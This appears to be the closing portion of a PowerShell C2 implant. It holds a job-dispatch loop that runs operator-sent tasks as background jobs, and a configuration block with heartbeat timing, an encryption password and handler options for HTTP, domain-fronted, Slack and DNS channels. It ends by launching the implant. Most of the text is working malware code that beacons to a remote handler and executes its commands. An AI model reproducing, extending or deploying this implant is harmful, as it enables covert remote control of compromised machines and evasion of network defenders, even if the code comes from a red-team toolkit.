            $job = $Jobs.data[$i];
            if($job.("payload").type -eq "exit"){
                try{
                sendJobResult $job._id "Bye!" $false;
                }catch{}
                finally{
                    Exit;
                }
            }
            if($job.("payload").type -eq "configure"){
                try{
                    if($PSVersionTable.PSVersion.Major -le 2){
                        if($job.("payload").("options").config.count -gt 0){
                            $config[[string]$job.("payload").("options").config.keys] = [string]$job.("payload").("options").config.values;
                        }
                        [String[]]$object = @(New-Object Psobject -property $config);
                        [String]$cmdOutput = $object | ConvertTo-Json;
                    }else{
                        $job.("payload").("options").config.PSObject.Properties | ForEach-Object {$config[$_.Name] = $_.Value;};
                        $cmdOutput = ConvertTo-Json $config -Compress -Depth 5;
                    }
                    sendJobResult $job._id $cmdOutput $false;
                }catch{
                }
            }else{
                Start-Job -ScriptBlock $executeJob -ArgumentList $job, $config, $defineFunctions | Out-Null;
            }
        }
    }
}

$config = @{}

# The sleep time between each heartbeat in seconds (varies from 0.7 to 1.3 times)
$config.sleep=1

# The sleep time between between pipe refresh (in ms)
$config.refreshrate=50

# The max size to read/write from a pipe
$config.buffersize=65536

# Slack bot and app tokens
#$config.slacktoken=NEEDEDFORSLACK
#$config.slacktokenApp=NEEDEDFORSLACK
#$config.slackchannel=NEEDEDFORSLACK

# Handler list separated by commas
# HTTP/HTTPS: HTTPAES256|https://WWW.WEBSITE.COM
# Domain Fronting: HTTPAES256FRONT|https://WWW.REALWEBSITE.COM|FAKEFRONT.COM
# Slack: SLACK
# DNS: DNSAES256|domain.com

$config.handlers="HTTPAES256|http://127.0.0.1:8888"

# Encryption password, must be set on the handler side as well
$config.password="password"

# Shell, must be powershell or cmd
$config.shell="powershell"

# Debug
$config.debug=$false

runImplant $config;
